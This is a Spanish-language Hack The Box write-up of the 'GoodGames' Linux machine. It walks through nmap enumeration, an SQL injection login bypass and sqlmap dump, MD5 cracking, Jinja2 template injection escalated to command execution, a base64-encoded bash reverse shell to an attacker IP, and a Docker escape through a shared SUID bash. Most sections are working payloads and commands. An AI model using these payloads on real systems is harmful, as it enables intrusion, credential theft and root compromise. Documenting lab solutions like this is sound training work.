# Hack The Box — GoodGames

| OS | Difficulty | Techniques |
|---|---|---|
| Linux | Easy | SQL injection, hash cracking, SSTI (Jinja2) to RCE, Docker container escape, credential reuse |

## Enumeración
Lanzo un escaneo completo de puertos con nmap para ver qué servicios están
expuestos:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.54.15 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC -Pn 10.129.54.15
```

El único puerto abierto es el 80.

Al mirarlo más de cerca veo que se trata de un servidor web montado sobre
Werkzeug 2.0.2 / Python 3.9.2, es decir, una aplicación Flask. El título de la
página es GoodGames | Community and Store .

 En el footer de la web aparece el dominio goodgames.htb , así que lo añado a
/etc/hosts :

```bash
echo "10.129.54.15 goodgames.htb" | sudo tee -a /etc/hosts
```

## Pre-Explotación
Inspeccionando el formulario de login, pruebo una inyección SQL básica de
bypass de autenticación en el campo email:

```bash
admin' or 1=1 -- -
```

La respuesta del servidor confirma que el campo email es vulnerable — entra
como admin .

Capturo la petición con BurpSuite, ya que las validaciones (formato de email)
están sólo en el frontend y el backend acepta cualquier cosa.

Efectivamente, con el payload de bypass entro como usuario admin.

## Explotación
## SQL Injection con sqlmap
Guardo la petición del login en un fichero login.req (con un email válido en el
body, sin payloads — de eso ya se encarga sqlmap) y lanzo sqlmap para
enumerar bases de datos:

```bash
sqlmap -r login.req -p email --batch --dbs
```

Detecta el parámetro email como inyectable mediante tres técnicas (boolean-based blind, time-based blind y UNION query). Las bases de datos disponibles
son information_schema y main .
Enumero las tablas de main :

```bash
sqlmap -r login.req -p email -D main --tables --batch
```

Devuelve tres tablas: user , blog y blog_comments .
Vuelco la tabla user :

```bash
sqlmap -r login.req -p email -D main -T user --dump --ignore-redirects --batch
```

```bash
Nota: el flag --ignore-redirects es importante. La app redirige a /profile tras
un login exitoso (con <meta http-equiv="refresh"> ), y si sqlmap sigue el redirect
no puede leer la salida de la inyección UNION.
```
Obtengo el hash de la contraseña del admin.

## Crackeo del hash
El hash es de tipo MD5 (32 caracteres hex, sin salt). Lo paso por CrackStation
y sale al momento:

 La contraseña es <redacted> .

## Acceso al panel interno
Autenticándome como admin en la web con esas credenciales, descubro un
panel de administración en un nuevo subdominio: internal-administration.goodgames.htb . Lo añado a /etc/hosts :

```bash
sudo sed -i 's/goodgames.htb/goodgames.htb internal-administration.goodgames.htb/g' /etc/hosts
```

En el subdominio hay un login de Flask Volt Dashboard. Pruebo reutilización de
credenciales ( admin / <redacted> ) — funciona.

## SSTI (Server-Side Template Injection)
En la página de settings puedo editar mi perfil. Como la app es Flask (Jinja2),
pruebo la carga útil clásica de SSTI en el campo Full Name:

```bash
{{7*7}}
```

Al guardar, el nombre se muestra como 49 → el servidor ha evaluado la
expresión. Confirmado SSTI en Jinja2.

 Escalo el SSTI a RCE con el clásico payload de Jinja2 abusando de os.popen :

```bash
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Compruebo que ejecuto comandos como root.

## Reverse shell
Codifico la reverse shell en base64 para evitar problemas con caracteres
especiales:

```bash
echo -n 'bash -i >& /dev/tcp/10.10.15.1/4444 0>&1' | base64
```

Levanto el listener en la máquina atacante:

```bash
nc -lvnp 4444
```

Y envío el payload SSTI con ${IFS} como sustituto de espacios (los espacios
literales dan problemas al ser evaluados dentro del popen ):

```bash
{{config.__class__.__init__.__globals__['os'].popen('echo ${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xLzQ0NDQgMD4mMQ==${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash').read()}}
```

Recibo la reverse shell como root dentro de un contenedor Docker.

Estabilizo la shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
```

## Post-Explotación
## Reconocimiento del contenedor
Al listar /home/augustus observo que el propietario aparece como UID 1000 en
lugar de un nombre — pista de que el directorio está montado desde el host
dentro del contenedor.

Confirmo con mount : /home/augustus , /etc/hostname , /etc/hosts y /etc/resolv.conf
están montados en modo rw desde el disco del host.

## Descubrimiento del host
La IP del contenedor es 172.19.0.2 . Por convención, Docker asigna la primera IP
de la subred al host, así que asumo 172.19.0.1 . Como no tengo nmap , uso un
bucle bash para escanear puertos:

```bash
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT" 2>/dev/null && echo "port $PORT is open"; done
```

Encuentro SSH (22) y HTTP (80) abiertos en el host.

## Movimiento lateral por reutilización de credenciales
Pruebo SSH al host como augustus con la contraseña <redacted> (misma
que la del panel):

```bash
ssh -o StrictHostKeyChecking=no augustus@172.19.0.1
```

Funciona — reutilización de contraseñas. Ya estoy en el host como usuario
augustus , y con esto obtengo la user flag en /home/augustus/user.txt .

## Escalada de privilegios: Docker Escape
Idea: en el contenedor soy root; en el host soy augustus . El directorio
 /home/augustus está compartido entre ambos. Si desde el contenedor coloco un

binario con SUID propiedad de root en ese directorio, cuando lo ejecute desde
el host como augustus , se ejecutará con los privilegios de su dueño (root).
Paso 1 — En el host como augustus , copio bash a mi home (para que aparezca
dentro del contenedor):

```bash
cp /bin/bash /home/augustus/bash
```

Paso 2 — En el contenedor como root, cambio propietario y aplico SUID sobre
ese fichero:

```bash
chown root:root /home/augustus/bash
chmod 4755 /home/augustus/bash
```

Paso 3 — De vuelta al host como augustus , verifico permisos y ejecuto con -p
(necesario para que bash mantenga los privilegios elevados en lugar de
descartarlos):

```bash
ls -la /home/augustus/bash
# -rwsr-xr-x 1 root root ... bash
./bash -p
id
# euid=0(root)
```

Ya soy root efectivo en el host. Leo la root flag en /root/root.txt ..
